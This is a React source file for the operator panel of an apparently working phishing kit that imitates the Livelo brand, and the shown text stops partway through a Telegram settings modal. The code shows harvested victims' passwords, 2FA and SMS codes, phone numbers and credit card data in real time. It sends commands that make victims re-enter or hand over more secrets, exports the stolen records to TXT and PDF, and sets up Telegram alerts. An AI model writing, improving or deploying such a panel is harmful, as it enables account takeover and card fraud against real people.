import { useState, useEffect, useRef, useCallback } from "react";
import axios from "axios";
import jsPDF from "jspdf";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function AdminPanel() {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [referenceField, setReferenceField] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
  const [copiedField, setCopiedField] = useState(null);
  const [isAuthenticated, setIsAuthenticated] = useState(!!localStorage.getItem("admin_token"));
  const [username, setUsername] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  // Modals
  const [showTelegramModal, setShowTelegramModal] = useState(false);
  const [showVisitorsModal, setShowVisitorsModal] = useState(false);
  const [telegramToken, setTelegramToken] = useState("");
  const [telegramChatId, setTelegramChatId] = useState("");
  const [telegramEnabled, setTelegramEnabled] = useState(false);
  const [telegramSaving, setTelegramSaving] = useState(false);
  const [telegramMessage, setTelegramMessage] = useState("");
  const [visitors, setVisitors] = useState([]);
  const [visitorsLoading, setVisitorsLoading] = useState(false);
  const [ccModalData, setCcModalData] = useState(null);
  // Modal de referência para comandos
  const [refModal, setRefModal] = useState(null); // { userId, command, label, placeholder }
  const [refModalValue, setRefModalValue] = useState("");
  const [historyModal, setHistoryModal] = useState(null); // attempt object
  const [toasts, setToasts] = useState([]);

  // Adicionar toast notification
  const addToast = useCallback((message) => {
    const id = Date.now();
    setToasts(prev => [...prev, { id, message, removing: false }]);
    // Iniciar fade out após 2s
    setTimeout(() => {
      setToasts(prev => prev.map(t => t.id === id ? { ...t, removing: true } : t));
    }, 2000);
    // Remover do DOM após 3s
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== id));
    }, 3000);
  }, []);

  // Notificação sonora
  const audioRef = useRef(null);
  const prevDataRef = useRef(null);

  const playNotification = useCallback(() => {
    try {
      if (!audioRef.current) {
        audioRef.current = new Audio("/notification.mp3");
      }
      audioRef.current.currentTime = 0;
      audioRef.current.play().catch(() => {});
    } catch (e) {}
  }, []);

  // Detectar novos dados ao atualizar loginAttempts
  useEffect(() => {
    if (!prevDataRef.current || !isAuthenticated) {
      prevDataRef.current = loginAttempts;
      return;
    }

    const prev = prevDataRef.current;
    const curr = loginAttempts;

    // Novo usuário chegou
    if (curr.length > prev.length) {
      const newUser = curr.find(c => !prev.find(p => p.id === c.id));
      playNotification();
      addToast(`Novo visitante: ${newUser?.email || "desconhecido"}`);
      prevDataRef.current = curr;
      return;
    }

    // Verificar se algum dado mudou (novo dado enviado pelo usuário)
    const dataFields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail", "credit_card", "cc_code"];
    const fieldLabels = { token_2fa: "2FA", email_input: "Email", sms_code: "Código SMS", phone_number: "Telefone", app_mail: "Token Email", credit_card: "Cartão", cc_code: "Código CC" };
    for (const attempt of curr) {
      const prevAttempt = prev.find(p => p.id === attempt.id);
      if (!prevAttempt) { playNotification(); addToast(`Novo visitante: ${attempt.email}`); break; }
      for (const field of dataFields) {
        if (attempt[field] && attempt[field] !== prevAttempt[field]) {
          playNotification();
          addToast(`${attempt.email}: ${fieldLabels[field]} recebido`);
          prevDataRef.current = curr;
          return;
        }
      }
      // Verificar tentativas adicionais de login
      if ((attempt.attempts?.length || 0) > (prevAttempt.attempts?.length || 0)) {
        playNotification();
        addToast(`${attempt.email}: Nova tentativa de login`);
        prevDataRef.current = curr;
        return;
      }
    }

    prevDataRef.current = curr;
  }, [loginAttempts, isAuthenticated, playNotification]);

  // Função para copiar texto com um clique
  const copyToClipboard = async (text, fieldId) => {
    if (!text || text === "-") return;
    try {
      await navigator.clipboard.writeText(text);
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 1500);
    } catch (err) {
      console.error("Erro ao copiar:", err);
    }
  };

  // ========== EXPORT TXT ==========
  const exportTXT = () => {
    if (loginAttempts.length === 0) return;
    let content = "═══════════════════════════════════════\n";
    content += "       RELATÓRIO DE TENTATIVAS DE LOGIN\n";
    content += "═══════════════════════════════════════\n\n";

    loginAttempts.forEach((attempt, index) => {
      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
      content += `───────────────────────────────────────\n`;
      content += `  #${index + 1} | ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})\n`;
      content += `───────────────────────────────────────\n`;
      content += `  Login:     ${attempt.email}\n`;
      content += `  Senha:     ${attempt.password || "-"}\n`;
      content += `  2FA:       ${attempt.token_2fa || "-"}\n`;
      content += `  Email:     ${attempt.email_input || "-"}\n`;
      content += `  SMS Code:  ${attempt.sms_code || "-"}\n`;
      content += `  Telefone:  ${attempt.phone_number || "-"}\n`;
      content += `  Tok-Mail:  ${attempt.app_mail || "-"}\n`;
      content += `  IP:        ${attempt.ip_address || "-"}\n`;
      content += `  País:      ${attempt.country || "-"}\n`;
      content += `  Device:    ${attempt.device || "Desktop"}\n`;
      content += `  Status:    ${attempt.status || "-"}\n`;
      content += `  Página:    ${attempt.page || "-"}\n`;
      
      if (attempt.attempts && attempt.attempts.length > 0) {
        content += `\n  Tentativas adicionais:\n`;
        attempt.attempts.forEach((a, i) => {
          content += `    ${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}\n`;
        });
      }
      content += `\n`;
    });

    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `login_attempts_${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // ========== EXPORT PDF ==========
  const exportPDF = () => {
    if (loginAttempts.length === 0) return;
    const doc = new jsPDF();
    let y = 20;

    doc.setFontSize(16);
    doc.setFont("helvetica", "bold");
    doc.text("Relatório de Tentativas de Login", 14, y);
    y += 10;
    doc.setFontSize(9);
    doc.setFont("helvetica", "normal");
    doc.text(`Gerado em: ${new Date().toLocaleString("pt-BR")}`, 14, y);
    y += 12;

    loginAttempts.forEach((attempt, index) => {
      if (y > 260) { doc.addPage(); y = 20; }
      
      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
      
      doc.setFontSize(11);
      doc.setFont("helvetica", "bold");
      doc.text(`#${index + 1} - ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})`, 14, y);
      y += 7;

      doc.setFontSize(9);
      doc.setFont("helvetica", "normal");
      const fields = [
        `Login: ${attempt.email}`,
        `Senha: ${attempt.password || "-"}`,
        `2FA: ${attempt.token_2fa || "-"}`,
        `Email: ${attempt.email_input || "-"}`,
        `SMS Code: ${attempt.sms_code || "-"}`,
        `Telefone: ${attempt.phone_number || "-"}`,
        `Tok-Mail: ${attempt.app_mail || "-"}`,
        `IP: ${attempt.ip_address || "-"} | País: ${attempt.country || "-"} | Device: ${attempt.device || "Desktop"}`,
      ];
      
      fields.forEach(field => {
        if (y > 280) { doc.addPage(); y = 20; }
        doc.text(field, 18, y);
        y += 5;
      });

      if (attempt.attempts && attempt.attempts.length > 0) {
        y += 2;
        doc.setFont("helvetica", "bold");
        doc.text("Tentativas adicionais:", 18, y);
        y += 5;
        doc.setFont("helvetica", "normal");
        attempt.attempts.forEach((a, i) => {
          if (y > 280) { doc.addPage(); y = 20; }
          doc.text(`${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}`, 22, y);
          y += 5;
        });
      }
      
      y += 8;
    });

    doc.save(`login_attempts_${new Date().toISOString().slice(0, 10)}.pdf`);
  };

  // ========== TELEGRAM CONFIG ==========
  const loadTelegramConfig = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;
      const response = await axios.get(`${API}/admin/telegram-config`, { headers });
      setTelegramToken(response.data.bot_token || "");
      setTelegramChatId(response.data.chat_id || "");
      setTelegramEnabled(response.data.enabled || false);
    } catch (error) {
      console.error("Erro ao carregar config Telegram:", error);
    }
  };

  const saveTelegramConfig = async () => {
    try {
      setTelegramSaving(true);
      setTelegramMessage("");
      const headers = getAuthHeaders();
      if (!headers) return;
      await axios.post(`${API}/admin/telegram-config`, {
        bot_token: telegramToken,
        chat_id: telegramChatId,
        enabled: telegramEnabled
      }, { headers });
      setTelegramMessage("Configuração salva com sucesso!");
    } catch (error) {
      setTelegramMessage("Erro ao salvar configuração");
    } finally {
      setTelegramSaving(false);
    }
  };

  const testTelegram = async () => {
    try {
      setTelegramMessage("Salvando e enviando teste...");
      const headers = getAuthHeaders();
      if (!headers) return;
      // Salvar primeiro para usar o token atual
      await axios.post(`${API}/admin/telegram-config`, {
        bot_token: telegramToken,
        chat_id: telegramChatId,
        enabled: telegramEnabled
      }, { headers });
      // Depois testar
      const response = await axios.post(`${API}/admin/telegram-test`, {}, { headers });
      setTelegramMessage(response.data.message);
    } catch (error) {
      setTelegramMessage("Erro ao enviar teste");
    }
  };

  // ========== VISITORS ==========
  const loadVisitors = async () => {
    try {
      setVisitorsLoading(true);
      const headers = getAuthHeaders();
      if (!headers) return;
      const response = await axios.get(`${API}/admin/visitors`, { headers });
      setVisitors(response.data);
    } catch (error) {
      console.error("Erro ao carregar visitantes:", error);
    } finally {
      setVisitorsLoading(false);
    }
  };

  const clearVisitors = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;
      await axios.delete(`${API}/admin/visitors`, { headers });
      setVisitors([]);
    } catch (error) {
      console.error("Erro ao limpar visitantes:", error);
    }
  };

  useEffect(() => {
    if (!isAuthenticated) return;
    fetchLoginAttempts();
    const interval = setInterval(fetchLoginAttempts, 1000);
    
    return () => {
      clearInterval(interval);
    };
  }, [isAuthenticated]);

  const getAuthHeaders = () => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      setIsAuthenticated(false);
      return null;
    }
    return { Authorization: `Bearer ${token}` };
  };

  const fetchLoginAttempts = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const response = await axios.get(`${API}/admin/login-attempts`, { headers });
      setLoginAttempts(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Erro ao buscar tentativas:", error);
      if (error.response?.status === 401) {
        localStorage.removeItem("admin_token");
        setIsAuthenticated(false);
      }
    }
  };

  const sendCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const payload = {
        user_id: userId,
        command: command,
      };

      if (command === "REDIRECT") {
        payload.redirect_url = redirectUrl;
      }
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        payload.reference = referenceField;
      }

      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  // Abrir modal de referência antes de enviar comando
  const openRefModal = (userId, command) => {
    const configs = {
      "TOK-TEL": { label: "Código do Telefone", placeholder: "Ex: 4 últimos dígitos do telefone" },
      "TOK-MAIL": { label: "Token do Email", placeholder: "Ex: email mascarado do usuário" },
      "COD-CC": { label: "Código do Cartão", placeholder: "Ex: Confira as transações do seu cartão Mastercard..." },
    };
    const cfg = configs[command];
    setRefModal({ userId, command, label: cfg.label, placeholder: cfg.placeholder });
    setRefModalValue("");
  };

  // Enviar comando com referência do modal
  const sendRefCommand = async () => {
    if (!refModal) return;
    try {
      const headers = getAuthHeaders();
      if (!headers) return;
      await axios.post(`${API}/admin/command`, {
        user_id: refModal.userId,
        command: refModal.command,
        reference: refModalValue,
      }, { headers });
      setRefModal(null);
      setRefModalValue("");
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  // Função para invalidar dado e pedir novamente
  const sendInvalidCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      // Limpar o campo correspondente
      await axios.post(`${API}/admin/invalidate-field`, {
        user_id: userId,
        command: command
      }, { headers });
      
      // Enviar o comando de invalidação (com sufixo -INV para mostrar erro)
      const payload = {
        user_id: userId,
        command: command + "-INV",  // Adiciona sufixo para indicar invalidação
      };
      
      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL, COD-CC)
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        payload.reference = referenceField;
      }
      
      await axios.post(`${API}/admin/command`, payload, { headers });
      
      // Limpar campo de referência após enviar comando que usa ele
      if (command === "TOK-TEL" || command === "TOK-MAIL" || command === "COD-CC") {
        setReferenceField("");
      }
      
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao invalidar campo:", error);
    }
  };

  const updateStatus = async (userId, status) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
    }
  };

  // Função para deletar um card individual
  const deleteAttempt = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja limpar todas as tentativas?")) {
      return;
    }

    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/clear-all`, {}, { headers });
      setLoginAttempts([]);
    } catch (error) {
      console.error("Erro ao limpar:", error);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    setIsAuthenticated(false);
  };

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    setLoginError("");
    setLoginLoading(true);

    try {
      const response = await axios.post(`${API}/admin/login`, {
        username,
        password: loginPassword,
      });

      localStorage.setItem("admin_token", response.data.access_token);
      setIsAuthenticated(true);
      setUsername("");
      setLoginPassword("");
    } catch (err) {
      setLoginError("Credenciais inválidas");
      setLoginLoading(false);
    }
  };

  // Tela de login se não autenticado
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="bg-[#111111] border border-green-900/30 rounded-2xl shadow-2xl shadow-green-900/10 p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-white mb-2">Admin Panel</h1>
            <p className="text-gray-500">Entre com suas credenciais</p>
          </div>

          <form onSubmit={handleAdminLogin} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Usuário
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                placeholder="donas"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Senha
              </label>
              <input
                type="password"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                className="w-full px-4 py-3 bg-[#0a0a0a] border border-[#333] rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-white placeholder-gray-600 transition-all"
                placeholder="••••••••"
                required
              />
            </div>

            {loginError && (
              <div className="bg-red-900/30 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                {loginError}
              </div>
            )}

            <button
              type="submit"
              disabled={loginLoading}
              className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-3 rounded-lg hover:bg-[#252525] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loginLoading ? "Entrando..." : "Entrar"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#08090d]">
      {/* Toast Notifications */}
      <div className="fixed top-4 right-4 z-50 flex flex-col gap-2">
        {toasts.map((toast) => (
          <div
            key={toast.id}
            className={`bg-[#13151c] border border-emerald-500/30 text-white px-4 py-2.5 rounded-lg shadow-lg shadow-black/40 text-sm font-medium flex items-center gap-2 transition-all duration-700 ${toast.removing ? "opacity-0 translate-x-4" : "opacity-100 translate-x-0"}`}
          >
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            {toast.message}
          </div>
        ))}
      </div>
      {/* Header */}
      <header className="bg-[#0d0f14] border-b border-[#1e2130] sticky top-0 z-40" style={{backdropFilter: 'blur(12px)'}}>
        <div className="max-w-[1920px] mx-auto px-5 py-3">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div className="flex items-center gap-1.5 flex-wrap">
              <button onClick={exportTXT} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                TXT
              </button>
              <button onClick={exportPDF} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                PDF
              </button>
              <button onClick={() => { setShowTelegramModal(true); loadTelegramConfig(); }} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                Telegram
              </button>
              <button onClick={handleClearAll} className="bg-[#13151c] hover:bg-[#2a1215] text-red-400/80 hover:text-red-400 px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-red-900/30">
                Limpar Tudo
              </button>
              <button onClick={fetchLoginAttempts} className="bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-emerald-500/25">
                Atualizar
              </button>
              <button onClick={() => { setShowVisitorsModal(true); loadVisitors(); }} className="bg-[#13151c] hover:bg-[#1a1d28] text-gray-300 hover:text-white px-3.5 py-1.5 rounded-md text-xs font-semibold transition-all border border-[#252838]">
                Visitantes
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" alt="Livelo" className="h-7 opacity-80" />
              <button onClick={handleLogout} className="text-gray-500 hover:text-gray-300 text-xs font-medium transition-colors">Sair</button>
              <div className="bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-bold tracking-wide">DONAS</div>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <div className="max-w-[1920px] mx-auto px-5 py-6">
        {/* Inputs */}
        <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">Referência</label>
            <input
              type="text"
              value={referenceField}
              onChange={(e) => setReferenceField(e.target.value)}
              placeholder="Ex: final do telefone, nome..."
              className="w-full px-3.5 py-2 bg-[#0d0f14] border border-[#1e2130] rounded-lg focus:ring-1 focus:ring-emerald-500/40 focus:border-emerald-500/30 text-white placeholder-gray-600 text-sm"
            />
          </div>
          <div>
            <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">Redirecionamento (Close)</label>
            <input
              type="text"
              value={redirectUrl}
              onChange={(e) => setRedirectUrl(e.target.value)}
              placeholder="https://business.google.com/"
              className="w-full px-3.5 py-2 bg-[#0d0f14] border border-[#1e2130] rounded-lg focus:ring-1 focus:ring-emerald-500/40 focus:border-emerald-500/30 text-white placeholder-gray-600 text-sm"
            />
          </div>
        </div>

          {/* Loading */}
          {loading ? (
            <div className="text-center py-16">
              <div className="inline-block animate-spin rounded-full h-8 w-8 border-2 border-emerald-500/30 border-t-emerald-500"></div>
              <p className="mt-3 text-gray-600 text-sm">Carregando...</p>
            </div>
          ) : loginAttempts.length === 0 ? (
            <div className="text-center py-16">
              <p className="text-gray-600 text-sm">Nenhuma tentativa de login</p>
            </div>
          ) : (
            <div className="space-y-5">
              {loginAttempts.map((attempt, index) => {
                const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
                const hb = attempt.last_heartbeat;
                const isOnline = hb && (Date.now() - new Date(hb).getTime()) < 3500;
                
                return (
                  <div key={attempt.id} className="bg-[#0d0f14] border border-[#1e2130] rounded-xl overflow-hidden hover:border-[#2a2d42] transition-colors">
                    {/* Card Header */}
                    <div className={`px-4 py-2.5 flex items-center justify-between border-b ${attempt.current_action && attempt.current_action !== "CLEAR" ? "border-emerald-500/30 bg-emerald-500/5" : "border-[#1e2130]"}`}>
                      <div className="flex items-center gap-3">
                        <span className={`w-2.5 h-2.5 rounded-full ${isOnline ? "bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.5)]" : "bg-red-500/80"}`}></span>
                        <span className="text-white font-semibold text-sm">{attempt.email}</span>
                        <span className="text-gray-600 text-xs">({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</span>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <button onClick={() => handleDelete(attempt.id)} className="text-gray-600 hover:text-red-400 p-1 rounded transition-colors text-sm">🗑️</button>
                      </div>
                    </div>

                    {/* Commands Bar */}
                    <div className="px-3 py-2 flex items-center gap-1 flex-wrap border-b border-[#161822] bg-[#0b0c11]">
                      <button onClick={() => sendCommand(attempt.id, "INV")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 transition-all">INV</button>
                      
                      <button onClick={() => sendCommand(attempt.id, "AUT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">AUT</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "AUT")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => sendCommand(attempt.id, "EMAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">EMAIL</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "EMAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => openRefModal(attempt.id, "TOK-TEL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">TOK-TEL</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => sendCommand(attempt.id, "TELEFONE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Nº TEL</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => openRefModal(attempt.id, "TOK-MAIL")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">TOK-MAIL</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => sendCommand(attempt.id, "CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">CC</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => openRefModal(attempt.id, "COD-CC")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Cod CC</button>
                      <button onClick={() => sendInvalidCommand(attempt.id, "COD-CC")} className="px-1.5 py-1 rounded text-[10px] font-bold bg-red-500/10 text-red-400/60 hover:text-red-400 hover:bg-red-500/20 transition-all">✕</button>
                      
                      <button onClick={() => sendCommand(attempt.id, "AGUARDE")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">👍</button>
                      <button onClick={() => sendCommand(attempt.id, "REDIRECT")} className="px-2.5 py-1 rounded text-[10px] font-bold bg-[#13151c] text-gray-300 hover:text-white hover:bg-[#1a1d28] border border-[#252838] transition-all">Close</button>
                    </div>

                    {/* Data - Compacto: Login + Último dado recebido */}
                    <div className="px-4 py-3 flex items-stretch gap-2">
                      <div className="flex-1 flex gap-2">
                        <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors flex-1" onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}>
                          <span className="text-[10px] text-gray-500 block">USUÁRIO</span>
                          <span className={`text-xs font-mono ${copiedField === `email-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `email-${attempt.id}` ? "Copiado!" : attempt.email}</span>
                        </div>
                        <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-[#161822] cursor-pointer hover:border-[#252838] transition-colors flex-1" onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}>
                          <span className="text-[10px] text-gray-500 block">SENHA</span>
                          <span className={`text-xs font-mono ${copiedField === `password-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>{copiedField === `password-${attempt.id}` ? "Copiado!" : (attempt.password || "-")}</span>
                        </div>
                      </div>
                      {/* Campo dinâmico - mostra último dado recebido */}
                      {(() => {
                        const lastEntry = attempt.history && attempt.history.length > 0 ? attempt.history[attempt.history.length - 1] : null;
                        if (!lastEntry) return (
                          <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-dashed border-[#1e2130] flex-1 flex items-center justify-center">
                            <span className="text-[10px] text-gray-600">Aguardando dados...</span>
                          </div>
                        );
                        return (
                          <div className="bg-[#0b0c11] rounded-lg px-3 py-2 border border-emerald-500/20 flex-1 cursor-pointer hover:border-emerald-500/40 transition-colors" onClick={() => copyToClipboard(lastEntry.value, `last-${attempt.id}`)}>
                            <span className="text-[10px] text-emerald-500/70 block">{lastEntry.label}</span>
                            <span className={`text-xs font-mono ${copiedField === `last-${attempt.id}` ? "text-emerald-400" : "text-white"}`}>
                              {copiedField === `last-${attempt.id}` ? "Copiado!" : (lastEntry.label === "Cartão" ? "Exibir" : lastEntry.value)}
                            </span>
                          </div>
                        );
                      })()}
                    </div>

                    {/* Footer */}
                    <div className="px-4 py-2 flex items-center justify-between border-t border-[#161822] bg-[#0a0b10]">
                      <div className="flex items-center gap-4 text-[10px] text-gray-600">
                        <span>IP: {attempt.ip_address || "-"}</span>
                        <span>País: {attempt.country || "-"}</span>
                        <span>Device: {attempt.device || "Desktop"}</span>
                        <span>Página: {attempt.page || "Loading..."}</span>
                      </div>
                      <button onClick={() => setHistoryModal(attempt)} className="text-[10px] text-gray-500 hover:text-white font-semibold px-2.5 py-1 rounded bg-[#13151c] border border-[#1e2130] hover:border-[#2a2d42] transition-all">
                        Histórico
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>

      {/* ========== MODAL TELEGRAM ========== */}
      {showTelegramModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowTelegramModal(false)}>
          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-lg p-6" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-white">Configurar Telegram</h2>
              <button onClick={() => setShowTelegramModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
            </div>

            <div className="space-y-4">
              {/* Toggle Ativar/Desativar */}
              <div className="flex items-center justify-between bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3">
                <span className="text-white font-medium text-sm">Notificações</span>
                <button
                  onClick={() => setTelegramEnabled(!telegramEnabled)}
                  className={`relative w-12 h-6 rounded-full transition-colors ${telegramEnabled ? 'bg-green-500' : 'bg-gray-600'}`}
                >
                  <span className={`absolute top-0.5 w-5 h-5 bg-white rounded-full transition-transform ${telegramEnabled ? 'left-6' : 'left-0.5'}`}></span>
                </button>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">Bot Token</label>
                <input
                  type="text"
                  value={telegramToken}
                  onChange={(e) => setTelegramToken(e.target.value)}
                  placeholder="123456789:ABCdefGHI..."
                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-[#333] rounded-lg text-white placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">Chat ID</label>
                <input
                  type="text"
                  value={telegramChatId}
                  onChange={(e) => setTelegramChatId(e.target.value)}
